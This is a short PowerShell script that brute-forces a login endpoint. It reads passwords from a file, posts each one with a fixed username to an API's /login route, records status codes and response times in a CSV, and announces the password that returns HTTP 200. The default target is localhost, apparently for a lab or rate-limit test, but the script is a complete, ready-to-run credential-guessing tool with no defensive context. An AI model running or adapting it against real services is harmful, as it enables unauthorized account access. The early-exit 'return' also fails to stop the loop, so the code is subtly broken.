Param(
  [string]$ApiUrl = "http://127.0.0.1:8000",
  [string]$User = "user1",
  [string]$PwFile = "passwords.txt",
  [double]$Delay = 0.5
)

$Out = "results.csv"
"timestamp,username,password,http_code,time_seconds" | Out-File -Encoding utf8 $Out

if (-not (Test-Path $PwFile)) {
  Write-Host "Password file not found: $PwFile"
  exit 1
}

Get-Content $PwFile | ForEach-Object {
  $pw = $_.TrimEnd("`r","`n")
  if ($pw -eq "") { return }
  $start = Get-Date
  $body = @{ username = $User; password = $pw } | ConvertTo-Json
  try {
    $resp = Invoke-RestMethod -Uri "$ApiUrl/login" -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
    $http = 200
  } catch {
    if ($_.Exception.Response -ne $null) {
      try { $http = $_.Exception.Response.StatusCode.Value__ } catch { $http = 0 }
    } else {
      $http = 0
    }
  }
  $end = Get-Date
  $elapsed = ($end - $start).TotalSeconds
  $ts = (Get-Date).ToString("s")
  "$ts,$User,$pw,$http,$elapsed" | Out-File -Append -Encoding utf8 $Out
  Write-Host "[$ts] tried '$pw' -> HTTP $http ($elapsed s)"
  if ($http -eq 200) {
    Write-Host "SUCCESS: username='$User' password='$pw'"
    return
  }
  Start-Sleep -Seconds $Delay
}

Write-Host "Finished. Results saved to $Out"
